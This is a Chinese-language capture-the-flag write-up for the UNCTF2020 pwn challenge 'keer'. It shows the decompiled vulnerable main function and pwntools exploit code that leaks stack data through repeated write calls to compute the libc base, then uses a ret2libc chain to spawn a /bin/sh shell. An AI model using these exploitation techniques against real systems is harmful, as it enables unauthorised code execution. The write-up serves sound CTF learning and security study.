
## keer's bug
- 题目描述
- 题目附件：[keer](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/unctf2020/pwn/keer/keer)
- 考察点：？迷惑
- 难度：一般

### 程序分析

``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[80]; // [rsp+0h] [rbp-50h]

  memset(s, 0, 0x50uLL);
  write(1, "Come on!! You can ri keer!!!\n", 0x1DuLL);
  read(0, s, 0x70uLL);
  return 0;
}
```

24字节栈溢出，也就是说ROP链只能有仨gadget。

### 解题思路
尝试栈迁移，感觉有点麻烦。于是利用`read`函数残留的参数，直接调用`write`，执行`write(0,s,0x70);`用于泄漏栈中变量，然后返回`main`。如此重复泄漏10次，可以得到ld中的`_dl_init+139`，由此可计算出libc基址。

``` python
offset = 88
payload = 'A'*offset
payload += p64(elf.sym['write'])
payload += p64(elf.sym['main'])

ru('Come on!! You can ri keer!!!\n')
stack = []
for i in range(10):
    se(payload)
    ru(payload)
    stack.append(uu64(ru('Come on!! You can ri keer!!!\n')))
    info_addr('stack[%d]'%i)

libcbase = stack[8]-0x3da80b
info_addr('libcbase')
```

然后ret2libc即可

``` python
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()

offset = 88
payload = 'A'*offset
payload += p64(prdi) + p64(binsh)
payload += p64(system)

sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/unctf2020/pwn/keer) 

